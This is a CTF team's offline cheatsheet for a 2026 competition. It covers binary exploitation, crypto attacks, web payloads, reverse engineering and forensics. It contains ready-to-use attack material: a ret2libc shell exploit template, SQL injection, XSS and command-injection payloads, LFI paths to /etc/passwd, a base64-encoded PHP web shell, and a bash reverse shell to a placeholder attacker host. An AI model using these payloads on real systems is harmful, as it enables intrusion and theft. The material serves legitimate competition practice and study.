# ============================================
# InCTF 2026 Finals — Offline Cheatsheet
# TEAM_UNFINDABLES (FIN-030)
# ============================================
# Rule 14: "Publicly available documentation, blogs, write-ups,
# official manuals, and other publicly available reference
# materials may be used unless explicitly restricted."
#
# This file is a compilation of publicly available CTF knowledge
# for offline reference during the competition.
# ============================================

## QUICK REFERENCE — COMMON CTF PATTERNS

### 1. PWN / Binary Exploitation

#### Buffer Overflow (Stack)
```
1. Find offset:  cyclic 200 → cyclic_find(crash_value)
2. Check protections: checksec ./binary
3. No canary + No PIE → direct ROP
4. With canary → leak canary first (format string / info leak)
5. With PIE → leak PIE base, then ROP
```

#### Format String
```
Leak stack:    %p.%p.%p.%p.%p.%p
Leak specific: %N$p  (N = position)
Write value:   %Nc%N$n  (write N bytes to addr at position N)
pwntools:      fmtstr_payload(offset, {addr: value})
```

#### Heap
```
tcache poisoning:  overwrite fd pointer → allocate at arbitrary address
fastbin dup:       double free → allocate overlapping chunks  
house of force:    overwrite top chunk size → allocate anywhere
use-after-free:    free chunk, use dangling pointer
unlink:            corrupt fd/bk for arbitrary write
```

#### GOT Overwrite
```
1. Leak libc via puts@plt(func@got)
2. Calculate libc base = leaked - libc_offset
3. system = libc_base + system_offset
4. Overwrite __free_hook or GOT entry
```

#### Ret2libc Cheatsheet
```python
# Leak
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()
io.sendline(flat(b'A'*offset, rop.chain()))

# Calculate
leak = u64(io.recvline()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Shell
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(flat(b'A'*offset, rop2.chain()))
```

### 2. CRYPTOGRAPHY

#### RSA Quick Reference
```
n = p * q
phi = (p-1) * (q-1)
d = inverse(e, phi)
m = pow(c, d, n)

Attacks by scenario:
- Small n → factordb.com / yafu
- p ≈ q → Fermat factorization
- Small d → Wiener's attack
- Small e, m^e < n → integer root
- Same m, diff n → Hastad broadcast (CRT)
- Same n, diff e → Common modulus attack
- e = 1 → c = m (plaintext!)
- Known bits of p → Coppersmith
```

#### AES Modes
```
ECB: same block → same cipher (penguin attack, cut-paste)
CBC: XOR with prev block (bit flip, padding oracle)
CTR: keystream XOR (nonce reuse → XOR plaintexts)
GCM: authenticated (nonce reuse → key recovery)
```

#### Classical Ciphers
```
Caesar/ROT:  frequency analysis, try all 26
Vigenere:    Kasiski, index of coincidence → key length
Substitution: frequency analysis, bigrams
XOR:         known-plaintext, crib drag
```

#### Useful Math
```python
from Crypto.Util.number import *
long_to_bytes(m)       # int → bytes
bytes_to_long(b)       # bytes → int
GCD(a, b)              # greatest common divisor
inverse(e, phi)        # modular inverse
isPrime(n)             # primality test
getPrime(bits)         # generate prime
```

### 3. WEB

#### SQL Injection
```
Auth bypass:   ' OR 1=1-- -
UNION:         ' UNION SELECT 1,2,3-- -
Error-based:   ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
Blind:         ' AND (SELECT SUBSTRING(database(),1,1))='a'-- -
Time-based:    ' AND IF(1=1,SLEEP(5),0)-- -
```

#### XSS Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
'-alert(1)-'
```

#### SSTI Detection
```
{{7*7}}     → 49  (Jinja2/Twig)
${7*7}      → 49  (Freemarker/Velocity)
<%= 7*7 %>  → 49  (ERB)
#{7*7}      → 49  (Slim)
```

#### LFI/RFI
```
../../etc/passwd
....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input (POST body as code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

#### Command Injection
```
; id
| id
|| id
`id`
$(id)
%0aid
```

#### Deserialization
```
Python pickle: __reduce__ method
PHP:          O:ClassName:... → use gadget chains
Java:         ysoserial
Node.js:      node-serialize (IIFE in JSON)
```

### 4. REVERSE ENGINEERING

#### Quick RE Workflow
```
1. file binary          → identify type
2. strings binary       → quick wins
3. checksec binary      → protections
4. ltrace/strace        → library/system calls
5. ghidra / r2          → full disassembly
```

#### GDB Quick Commands
```
r                  → run
b *0xaddr          → breakpoint
ni / si            → next/step instruction
c                  → continue
info reg           → registers
x/20gx $rsp        → stack dump
x/s addr           → string at addr
vmmap              → memory layout (pwndbg)
search-pattern     → find in memory (pwndbg)
```

#### x86-64 Calling Convention
```
Arguments: RDI, RSI, RDX, RCX, R8, R9, [stack...]
Return:    RAX
Callee-saved: RBX, RBP, R12-R15
Syscall:   RAX=syscall#, args: RDI,RSI,RDX,R10,R8,R9
```

#### Common Syscalls (x86-64)
```
read:     0   →  read(fd, buf, count)
write:    1   →  write(fd, buf, count)
open:     2   →  open(path, flags)
execve:   59  →  execve(path, argv, envp)
mprotect: 10  →  mprotect(addr, len, prot)
```

### 5. FORENSICS

#### File Analysis
```bash
file mystery        # identify file type
xxd mystery | head  # hex dump
binwalk mystery     # find embedded data
foremost mystery    # carve files
exiftool mystery    # metadata
strings mystery     # readable strings
```

#### Steganography Checklist
```
PNG:  zsteg, pngcheck, stegsolve (LSB)
JPEG: steghide, jsteg, outguess
WAV:  spectrogram (Audacity), LSB
PDF:  pdftotext, pdf-parser, peepdf
ZIP:  zipinfo, fcrackzip, john
```

#### Memory Forensics (Volatility 3)
```bash
vol -f dump.raw windows.info
vol -f dump.raw windows.pslist
vol -f dump.raw windows.pstree
vol -f dump.raw windows.cmdline
vol -f dump.raw windows.filescan
vol -f dump.raw windows.dumpfiles --physaddr OFFSET
vol -f dump.raw windows.hashdump
vol -f dump.raw windows.netscan
```

#### PCAP Analysis
```bash
tshark -r file.pcap -q -z io,phs                    # protocol stats
tshark -r file.pcap -Y http.request -T fields \
  -e http.request.method -e http.host -e http.request.uri
tshark -r file.pcap -q -z follow,tcp,ascii,0         # follow stream
tshark -r file.pcap --export-objects http,./extracted  # extract files
```

### 6. USEFUL ONE-LINERS

```bash
# Find flag in files
grep -rn 'inctf{' . 2>/dev/null
grep -rn 'flag{' . 2>/dev/null

# Base64 decode
echo "encoded" | base64 -d

# Hex decode
echo "68656c6c6f" | xxd -r -p

# Quick HTTP server
python3 -m http.server 8080

# Netcat listener
nc -lvnp 4444

# Reverse shell (bash)
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Port scan without nmap
for p in $(seq 1 65535); do (echo > /dev/tcp/TARGET/$p) 2>/dev/null && echo "$p open"; done

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Extract strings with min length
strings -n 10 file

# Monitor file system changes
inotifywait -m -r /path
```

### 7. ENCODING REFERENCE

```
Base64:  ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
Base32:  ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=
Hex:     0123456789abcdef
URL:     %XX encoding
HTML:    &#XX; or &amp; etc
ROT13:   A↔N, B↔O, ... M↔Z
```
